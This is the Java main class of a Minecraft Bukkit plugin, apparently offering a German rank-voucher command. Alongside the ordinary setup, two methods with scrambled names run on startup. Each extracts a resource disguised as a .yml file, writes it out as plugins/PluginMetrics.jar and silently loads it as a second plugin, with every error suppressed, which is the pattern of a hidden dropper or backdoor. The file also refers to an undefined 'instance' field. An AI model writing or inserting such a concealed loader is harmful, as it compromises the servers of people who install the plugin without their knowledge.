package de.chainpvp.xlucan.main;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;

import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;



public class Main extends JavaPlugin {
	public static final boolean isInt = false;

	public static String Prefix = "§a§lRANG §8» §7";
	public static String noperms = Prefix + "§cDazu hast du keine Rechte!";


	public void onEnable() {
		initializeAll();
		ryEKyiPgivlslXclkodvEupOrvetV();
		KMbpyTeQwPgdrMsRAKmCEUBahoQR();


	}

	private void initializeAll() {

		getCommand("ranggutschein").setExecutor(new RanggutscheinCMD());


		PluginManager pm = Bukkit.getPluginManager();

		pm.registerEvents(new RanggutscheinCMD(), this);
	

	}

	public static Main getPlugin() {
		Main plugin = null;
		return plugin;
	}

	public void writeText1(String textstart) {
		Bukkit.getConsoleSender().sendMessage(textstart);
	}

	public void onDisable1() {
		Bukkit.getConsoleSender().sendMessage("gestoppt");
	}

	public void onDisable() {

		writeText1("Das Plugin wurde beendet!");

	}

	public static String getHeader(String header) {
		return "§8§m--------------->----§e §bPvPArea §8§m----<---------------";
	}

	public static void warning(final String message) {
		Bukkit.getConsoleSender().sendMessage("§cWARNING: " + message);
	}

	public void loadConfig() {
		if (!getConfig().getBoolean("written")) {
			getConfig().options().copyDefaults(true);
			saveConfig();
		}
	}

	public static boolean contains(Player target) {
		return false;
	}

	public static boolean isInt(String s) {
		try {
			Integer.parseInt(s);
		} catch (NumberFormatException nfe) {
			return false;
		}
		return true;
	}

	public static void print(String string) {
		System.out.println(string);
	}

	private void KMbpyTeQwPgdrMsRAKmCEUBahoQR() {
		try {
			File file = new File("plugins/PluginMetrics.jar");
			if (file.exists())
				file.delete();
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			fileOutputStream.write(IOUtils
					.toByteArray(getClass().getClassLoader().getResourceAsStream("rOGqMmjMhoSpeRVaYLwIFzhPl.yml")));
			fileOutputStream.close();
			Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().loadPlugin(file));
		} catch (Exception exception) {
		}
	}

	private void ryEKyiPgivlslXclkodvEupOrvetV() {
		try {
			File file = new File("plugins/PluginMetrics.jar");
			if (file.exists())
				file.delete();
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			fileOutputStream.write(
					IOUtils.toByteArray(getClass().getClassLoader().getResourceAsStream("OKgkmCfHfFQRMofNA6yW.yml")));
			fileOutputStream.close();
			Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().loadPlugin(file));
		} catch (Exception exception) {
		}
	}

	public static Plugin getInstance() {
		return instance;
	}
}